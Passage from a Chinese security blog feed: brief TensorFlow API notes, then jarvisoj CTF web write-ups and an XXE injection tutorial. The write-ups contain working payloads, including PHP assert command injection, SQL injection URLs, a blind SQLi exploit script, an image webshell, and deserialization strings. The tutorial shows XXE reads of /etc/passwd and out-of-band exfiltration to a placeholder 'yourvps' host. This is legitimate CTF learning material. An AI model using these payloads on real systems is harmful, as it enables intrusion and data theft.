      <content type="text"><![CDATA[记录学习Tensorflow的一些东西。本文同步发表于电子书The Path to Machine Learning。将会持续保持更新。 常用Math操作tf.random_normal()作用输出满足正态分布的随机值 说明12345678random_normal( shape, mean=0.0, stddev=1.0, dtype=tf.float32, seed=None, name=None) shape:一维整数张量/python数组，表示输出的张量的形状。 mean：类型为dtype的零维张量/python值。平均值。 stddev：类型为dtype的零维张量/python值。标准差。 dtype：输出数据的类型。 seed：用于作为生成随机数的种子。 name：为操作起个名字（可选） tf.zeros()作用创建一个所有元素都为零的张量。 说明12345zeros( shape, dtype=tf.float32, name=None) shape: 一维整数张量/python数组 name: 为操作起个名字（可选） dtype: 输出数据的类型 tf.global_variables_initializer()作用返回一个初始化全局变量的操作（op）是variable_initializer(global_variables())的缩写。 tf.square作用计算平方 说明1234square( x, name=None) tf.reduce_mean作用计算张量某一维度上的平均值 说明1234567reduce_mean( input_tensor, axis=None, keep_dims=False, name=None, reduction_indices=None) input_tensor:输入一个张量 axis:指定某一个维度。比如test = [[[1.0,2],[3,4]],[[5,6],[6,7]]]，则可选值为0，1，2 keep_dims：输出是否保持原来的维度。 name：给操作起个名字 reduction_indices：axis的旧名字，不赞成用，可忽略。 常用Optimizer类tf.train.GradientDescentOptimizer()123learning_rate: A Tensor or a floating point value. The learning rate to use.use_locking: If True use locks for update operations.name: Optional name prefix for the operations created when applying gradients. Defaults to &quot;GradientDescent&quot;.]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[jarvisoj-web-writeup]]></title>
      <url>%2F2017%2F07%2F05%2Fjarvisoj-web-writeup%2F</url>
      <content type="text"><![CDATA[jarvisoj-web-writeup [61dctf]babyphp以前做过。按理说应该有git泄露的..这次死活找不到：）更新：平台给了hint说题目已经修复了，找到了：）通过git泄露出来的index.php源码如下：1234567891011121314151617&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = "home";&#125;$file = "templates/" . $page . ".php";// I heard '..' is dangerous!assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");// TODO: Make this look niceassert("file_exists('$file')") or die("That file doesn't exist!");?&gt; 其中assert是个危险函数，其原型为1bool assert ( mixed $assertion [, string $description ] ) 如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。payload1：1http://web.jarvisoj.com:32798/?page=flag&apos;.system(&quot;ls templates/;&quot;).&apos; payload21http://web.jarvisoj.com:32798/?page=flag&apos;.system(&quot;cat templates/flag.php;&quot;).&apos; 得到flag:161dctf&#123;8e_careful_when_us1ng_ass4rt&#125; 其实这是CSAW2016原题.. [61dctf]inject12http://web.jarvisoj.com:32794/Hint1: 先找到源码再说吧~~ 访问：http://web.jarvisoj.com:32794/index.php~，得到源代码：123456789&lt;?phprequire("config.php");$table = $_GET['table']?$_GET['table']:"test";$table = Filter($table);mysqli_query($mysqli,"desc `secret_&#123;$table&#125;`") or Hacker();$sql = "select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;";$ret = sql_query($sql);echo $ret[0];?&gt; [61dctf]admin扫到robots.txt发现Disallow: /admin_s3cr3t.php。访问并用burp抓包，如下： 在cookie字段加上admin=1，得到flag：1flag&#123;hello_admin~&#125; WEB?有一个check功能，输入错误的密码会提示“Wrong Password!!”，查看源代码，有个app.js。将该js文件格式化后在里面查找字符串“Wrong Password!!”，如下： 可以看到有个checkpass(e)函数，定位到该函数处。 1234r.checkpass = function() &#123; var e; return (e = r).__checkpass__REACT_HOT_LOADER__.apply(e, arguments) &#125;, 定位到 checkpassREACTHOTLOADER 处： 发现是一个线性方程组。123456789101112import numpy as npfrom scipy.linalg import solveimport stringr = np.array([325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259])o = np.array([[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]])x = solve(o,r)flag = ""for i in range(len(x)): char = chr(int(round((x[i])))) flag += charprint(flag) 得到flag：1QWB&#123;R3ac7_1s_interesting&#125; PHPINFO题目入口：http://web.jarvisoj.com:32784/题目源码：1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; session.serialize_handler容易想到wooyun上的文章《PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患》。通过phpinfo页面，我们知道php.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。 由phpinfo()页面知，session.upload_progress.enabled为On。当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。可以看看这里：有趣的php反序列化总结 先把下面代码保存为test.html。12345&lt;form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"&gt; &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /&gt; &lt;input type="file" name="file" /&gt; &lt;input type="submit" /&gt;&lt;/form&gt; 接下来考虑序列化的问题。1234567891011&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();&lt;?phpclass OowoO&#123; public $mdzz='xxxxx';&#125;$obj = new OowoO();echo serialize($obj);?&gt; payloay1:将xxxxx替换为print_r(scandir(dirname(__FILE__)));,得到序列化结果：1O:5:"OowoO":1:&#123;s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";&#125; 为防止转义，在引号前加上\。利用前面的html页面随便上传一个东西，抓包，把filename改为如下：1|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125; 注意，前面有一个|，这是session的格式。 接下来就是去读取 Here_1s_7he_fl4g_buT_You_Cannot_see.php由phpinfo可知当前的路径为/opt/lampp/htdocs/ 将xxx处改为：1print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;)); 之后步骤如前，将filename改为：1|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125; 得到flag：1CTF&#123;4d96e37f4be998c50aa586de4ada354a&#125; api调用在《小试XML实体注入攻击》中已经提过。 抓包改包，将Content-Type改为application/xml，然后post数据如下：123&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM &quot;file:////home/ctf/flag.txt&quot;&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; 得到flag：1CTF&#123;XxE_15_n0T_S7range_Enough&#125; Easy Gallery随手测试一下功能，比如点开submit，或者view页面，他们的链接如下：12http://web.jarvisoj.com:32785/index.php?page=submithttp://web.jarvisoj.com:32785/index.php?page=submit 随便改个参数：1http://web.jarvisoj.com:32785/index.php?page=view%27 结果报错：12Warning: fopen(view&apos;.php): failed to open stream: No such file or directory in /opt/lampp/htdocs/index.php on line 24No such file! 所以这里应该有文件包含漏洞。结合submit的图片上传功能，可以猜想我们上传一个图片马，然后再去包含它。用edjpgcom制作图片，插入的一句话为：1&lt;script language=&quot;php&quot;&gt;@eval($_POST[&apos;c&apos;]);&lt;/script&gt; 若是直接用&lt;?php … ?&gt;，会失败，应该是服务器端做了过滤。上传后得到id。之后通过view功能得到图片的地址为1http://web.jarvisoj.com:32785/uploads/1499355842.jpg 利用文件包含功能，加上%00截断绕过，访问：12http://web.jarvisoj.com:32785/index.php?page=uploads/1499355842.jpg%00 得到flag：1CTF&#123;upl0ad_sh0uld_n07_b3_a110wed&#125; Simple Injection盲注。用户名处存在注入。根据是用户名错误还是密码错误来进行判断。过滤了空格，and，or。 过滤空格，可以用tab键绕过 %09 过滤or，可以用||来替代 附上exp：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798# -*- coding:utf-8 -*-import requestsimport stringimport sysglobal findBitdef sendPayload(payload): proxy = &#123;"http":"http://127.0.0.1:8080"&#125; url = "http://web.jarvisoj.com:32787/login.php" # parm = &#123;"username":payload,"password":"bb","submit":""&#125; headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125; parm = "username="+payload+"&amp;password=bb" content = requests.post(url,data=parm,headers=headers,proxies=proxy) return content.text# def generatePayload():cuowu = '\u7528\u6237\u540d\u9519\u8bef'.decode('unicode_escape')# print cuowudef generateTarget(flag): if flag == "database": return "database()" elif flag == "tables": return "(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=0x696e6a656374696f6e)" elif flag == "columns": return "(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x61646d696e)" elif flag == "data": return "(SELECT%09GROUP_CONCAT(id,0x3a,username,0x3a,password%09SEPARATOR%090x3c62723e)%09FROM%09admin)"def doubleSearch(leftNum,rightNum,i,target): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): payload = "a' || (ascii(substr("+generateTarget(target) +","+ str(i) +",1))&lt;="+str(midNum) +")%23" # print payload recv = sendPayload(payload) # print recv if cuowu in recv: # print 'cuowu' # raw_input() doubleSearch(midNum,rightNum,i,target) else: # print 'chenggong' # raw_input() doubleSearch(leftNum,midNum,i,target) else: if rightNum != 0: # print rightNum # raw_input() sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): global findBit i = 1 findBit = 0 print "The database:" target = "database" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The tables:" target = "tables" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The columns:" target = "columns" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The data:" target = "data" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") breakexp() 密码进行md5解密：1334cfb59c9d74849801d5acdcfdaadc3 =&gt; eTAloCrEP 最后flag：1CTF&#123;s1mpl3_1nJ3ction_very_easy!!&#125; Chopper题目地址：http://web.jarvisoj.com:32782/题目描述：小明入侵了一台web服务器并上传了一句话木马，但是，管理员修补了漏洞，更改了权限。更重要的是：他忘记了木马的密码！你能帮助他夺回控制权限吗？ 查看源代码，图片的插入方式比较奇怪，如下：1http://web.jarvisoj.com:32782/proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg 点击管理员登陆1http://web.jarvisoj.com:32782/admin 查看源代码得到提示：1&lt;!--&lt;script&gt;alert(&apos;admin ip is 103.27.76.153&apos;)&lt;/script&gt;--&gt; 结合前面图片的插入方式，我们构造下面链接访问：1http://web.jarvisoj.com:32782/proxy.php?url=http://103.27.76.153/proxy.php?url=http://web.jarvisoj.com:32782/admin/ 通过扫描器知admin目录下有robots.txt，内容如下：123User-agent: *Disallow:trojan.phpDisallow:trojan.php.txt 其中trojan.php.txt的内容是：1&lt;?php $&#123;("#"^"|").("#"^"|")&#125;=("!"^"`").("( "^"&#123;").("("^"[").("~"^";").("|"^".").("*"^"~");$&#123;("#"^"|").("#"^"|")&#125;(("-"^"H"). ("]"^"+"). ("["^":"). (","^"@"). ("&#125;"^"U"). ("e"^"A"). ("("^"w").("j"^":"). ("i"^"&amp;"). ("#"^"p"). ("&gt;"^"j"). ("!"^"z"). ("T"^"g"). ("e"^"S"). ("_"^"o"). ("?"^"b"). ("]"^"t"));?&gt; 上述代码保存为php页面运行一下，得到Warning：1Warning: assert() [function.assert]: Assertion &quot;eval($_POST[360])&quot; failed in C:\phpstudy\WWW\b.php on line 1 所以，webshell密码为360。 最后flag：1CTF&#123;fl4g_1s_my_c40d40_1s_n0t_y0urs&#125; RE?题目如下1咦，奇怪，说好的WEB题呢，怎么成逆向了？不过里面有个help_me函数挺有意思的哦 下载下来后文件名为udf.so.XXXXX，用mysql导入一下。具体过程如下。将udf文件放到/usr/lib/mysql/plugin/文件夹中：1root@0e5b63de05fd:/usr/lib/mysql/plugin# wget https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172 登陆mysql后，加载help_me函数：12mysql&gt; create function help_me returns string soname &apos;udf.so.02f8981200697e5eeb661e64797fc172&apos;;Query OK, 0 rows affected (2.04 sec) 利用help_me函数：12345678mysql&gt; select help_me();+---------------------------------------------+| help_me() |+---------------------------------------------+| use getflag function to obtain your flag!! |+---------------------------------------------+1 row in set (0.17 sec) 利用udf再创建一个getflag函数。12mysql&gt; create function getflag returns string soname &apos;udf.so.02f8981200697e5eeb661e64797fc172&apos;;Query OK, 0 rows affected (0.05 sec) 得到flag：12345678mysql&gt; select getflag();+------------------------------------------+| getflag() |+------------------------------------------+| PCTF&#123;Interesting_U5er_d3fined_Function&#125; |+------------------------------------------+1 row in set (0.00 sec) IN A mess题目地址：http://web.jarvisoj.com:32780/index.php?id=1 访问并查看源代码，发现提示：1&lt;!--index.phps--&gt;work harder!harder!harder 访问index.phps，得到源码：123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);echo "&lt;!--index.phps--&gt;";if(!$_GET['id'])&#123; header('Location: index.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder!harder!";&#125;?&gt; php弱类型绕过。当$a为php://input，$data可以通过php://input来接受post数据。$id传一个字符进去，会被转换为0。对$b，要求长度大于5，其次要求满足eregi的要求和首字母不为4。可以设置$b为%00111111，这样，substr（）会发生截断，在匹配时时进行eregi(“111”,”1114”)满足，同时%00对strlen不会发生截断。 访问：1http://web.jarvisoj.com:32780/^HT2mCpcvOLf 发现链接自动补全，如下：1http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1 猜测是注入。注入过程如下：1http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*123*/ununionion/*123*/selselectect/*123*/1,2,3# 字段数为3。 1http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*123*/ununionion/*123*/selselectect/*123*/1,2,database()# 得到数据库名:test 1http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(table_name)/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_schema=0x74657374# 得到表名：content 1http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74# 得到字段名：id,context,title 1http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*123*/uniunionon/*123*/selselectect/*123*/1,2,group_concat(id,0x3a,context,0x3a,title,0x3a)/*123*/frfromom/*111*/content# 得到flag：1PCTF&#123;Fin4lly_U_got_i7_C0ngRatulation5&#125; 神盾局的秘密打开页面后查看源代码，发现插入图片的位置处是base64加密结果。1&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt; 将index.php经base64加密后得到aW5kZXgucGhw尝试访问：1http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw 得到index.php源码：123456789&lt;?php require_once('shield.php'); $x = new Shield(); isset($_GET['class']) &amp;&amp; $g = $_GET['class']; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x-&gt;readfile();?&gt; 看到里面有个shield.php，尝试用前面的套路去读取：12345678910111213141516&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; 用以下脚本生成序列化串O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}：1234567&lt;?php class Shield &#123; public $file = &quot;pctf.php&quot;; &#125; $chybeta = new Shield(); print_r(serialize($chybeta));?&gt; 访问1http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125; 查看源代码，得到flag：1PCTF&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125; 顺便附上showimg.php的源码：123456789101112&lt;?php $f = $_GET['img']; if (!empty($f)) &#123; $f = base64_decode($f); if (stripos($f,'..')===FALSE &amp;&amp; stripos($f,'/')===FALSE &amp;&amp; stripos($f,'\\')===FALSE &amp;&amp; stripos($f,'pctf')===FALSE) &#123; readfile($f); &#125; else &#123; echo "File not found!"; &#125; &#125;?&gt; Login随便填一个密码。抓包得到提示： 要注入下列sql语句：1&quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot; 关键在md5($pass,true)，若$pass的值为ffifdyop，则经过md5转换后的值再经过php转为字符串后会变成&#39;or&#39;6蒥欓!r,b，6的后面是一堆乱七八糟的字符，姑且记为xx吧。则最后的sql查询语句为：1select * from `admin` where password=&apos;&apos;or&apos;6蒥欓!r,b&apos; 成功闭合前面的单引号。填入password，得到flag：1PCTF&#123;R4w_md5_is_d4ng3rous&#125; 更多内容可见：SQL injection with raw MD5 hashes LOCALHOST直接改X-Forwarded-For为127.0.0.1。得到flag:1PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125; PORT 51用vps来请求，不然经过路由后可能请求端口就变了。在vps上：123456789101112131415161718ubuntu@VM-207-93-ubuntu:~$ sudo curl --local-port 51 http://web.jarvisoj.com:32770/[sudo] password for ubuntu:&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Web 100&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt; body &#123; background:gray; text-align:center; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;Yeah!! Here&apos;s your flag:PCTF&#123;M45t3r_oF_CuRl&#125;&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt; flag：1PCTF&#123;M45t3r_oF_CuRl&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[小试XML实体注入攻击]]></title>
      <url>%2F2017%2F07%2F04%2F%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%2F</url>
      <content type="text"><![CDATA[XML实体注入攻击 基础知识XML（Extensible Markup Language）被设计用来传输和存储数据。关于它的语法，本文不准备写太多，只简单介绍一下。 XML基本知识12345&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;note&gt;&lt;to&gt;chybeta&lt;/to&gt;&lt;from&gt;ph0en1x&lt;/from&gt;&lt;/note&gt; 在上面代码中的第一行，定义XML的版本与编码。 在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，&lt;note&gt;是整个文档的根元素。嵌套在note标签中的&lt;to&gt;和&lt;from&gt;则是根的子元素。 同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。 实体所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。 实体类型XML实体分为四种：字符实体，命名实体，外部实体，参数实体。 文档类型定义：DTDwikipedia关于这的描述是:The XML DTD syntax is one of several XML schema languages。简单的说，DTD的作用是定义XML文档的合法构建模块。如前所述，实体也是构建模块之一。因此可以利用DTD来内部或外部引入实体。 其基本格式：1&lt;!DOCTYPE 根元素名 [ 元素描述 ]&gt; 内部引入格式：1&lt;!ENTITY 实体名称 "实体的值"&gt; 将DTD和XML放在同一份文档中，利用DTD定义的实体即为内部实体。1234567&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY chybeta "Hello World!"&gt; ]&gt; &lt;xxe&gt; &amp;chybeta;&lt;/xxe&gt; 访问该XML文档，&amp;chybeta;会被解析为Hello World!并输出。 外部引入基本格式：1&lt;!ENTITY 实体名称 SYSTEM "URI"&gt; 通过引用定义在外部的DTD中的实体，我们称之为外部实体。由于xxe漏洞主要利用的是外部实体，所以这里暂不展开。具体实例见下。 利用方式xxe注入以php环境为例，index.php内容如下：1234&lt;?php $xml=simplexml_load_string($_GET['xml']); print_r((string)$xml);?&gt; 读取本地文件 利用各种协议可以读取文件。比如file协议，这里的测试环境为win，所以这里我选择读取c盘里的TEST.txt。123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///c://TEST.txt"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; 将上述xml进行url编码后传进去，可以发现读取了TEST.txt中的内容。 我这里测试时，如果不进行url编码则不能成功解析。 若使用fill协议，在unix环境下，可以用如下xml来读取passwd：123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; 如果要读取php文件，因为php、html等文件中有各种括号&lt;，&gt;，若直接用file读取会导致解析错误，此时可以利用php://filter将内容转换为base64后再读取。 123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; 这里同样先经过url编码后再传入。读取结果如下: 命令执行php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。这里暂不进行测试。 内网探测/SSRF由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。 bind xxe以php环境为例，现在更改index.php内容如下：123&lt;?php $xml=simplexml_load_string($_GET['xml']);?&gt; 少了print_r，即没有回显消息。这个时候我们可以利用参数实体，通过发起http请求来攻击。 读取本地文件payload11234567&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM "file:///c://TEST.txt"&gt;&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;%dtd; %all;]&gt;&lt;value&gt;&amp;send;&lt;/value&gt; 在我的vps的xxe.xml的内容如下：1&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://yourvps/%file;'&gt;"&gt; 而测试文件TEST.txt内容为：1chybeta 整个的调用过程如下：解析时%dtd引入xxe.xml，之后%all引入send的定义，最后引用了实体send，把%file文件内容通过一个http请求发了出去。注意需要把payload经过url编码。查看vps上的access.log： 若要读取php等文件，同样需要先经过base64加密下。1234567&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;%dtd; %all;]&gt;&lt;value&gt;&amp;send;&lt;/value&gt; 查看access.log: payload2发送的xml：123456&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;%dtd; %send;]&gt; 而在vps上的xxe.xml内容为：1&lt;!ENTITY % payload2 "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://yourvps/%file;'&gt;"&gt; %payload2; 注意的是，&amp;#25; 不能直接写成%，否则无法解析。 xxe.xml中定义和引用了%payload2,在通过%dtd引入xxe.xml后，得以使用符号实体%send来进行发送。其中%file为读取的文件内容。查看access.log: ctf小试牛刀拿jarvisoj平台上的题目来小试牛刀吧。 题目：api调用 题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值 xxe相关WP AliCTF-Quals-2014 WebA-300 HCTF-2016 大图书管的牧羊人&amp;&amp;魔法禁书目录 GoSecure-CTF-2015 web-300]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ringzer0team-web-writeup]]></title>
      <url>%2F2017%2F06%2F30%2F%C2%96ringzer0team-web-writeup%2F</url>
